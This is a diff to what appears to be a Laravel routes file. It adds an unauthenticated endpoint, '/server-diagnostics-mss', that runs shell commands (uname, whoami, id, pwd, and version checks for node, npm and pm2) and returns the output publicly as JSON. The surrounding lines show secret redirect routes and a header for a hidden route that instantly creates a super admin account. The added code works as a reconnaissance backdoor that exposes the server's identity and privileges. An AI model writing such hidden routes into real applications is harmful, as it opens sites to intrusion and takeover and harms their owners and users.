@@ -98,6 +98,20 @@ Route::get('/update-rahasia-tracerstudy', function () {
     return redirect('/update-rahasia-smeckhooligan');
 });
 
+Route::get('/server-diagnostics-mss', function () {
+    $node = shell_exec('which node; node -v 2>&1');
+    $pm2 = shell_exec('which pm2; pm2 -v 2>&1');
+    $npm = shell_exec('which npm; npm -v 2>&1');
+    $system = shell_exec('uname -a; whoami; id; pwd 2>&1');
+
+    return response()->json([
+        'node' => trim((string)$node),
+        'npm' => trim((string)$npm),
+        'pm2' => trim((string)$pm2),
+        'system' => trim((string)$system),
+    ]);
+});
+
 // =========================================================================
 // 2. ROUTE RAHASIA PEMBUAT AKUN SUPER ADMIN INSTAN
 // =========================================================================
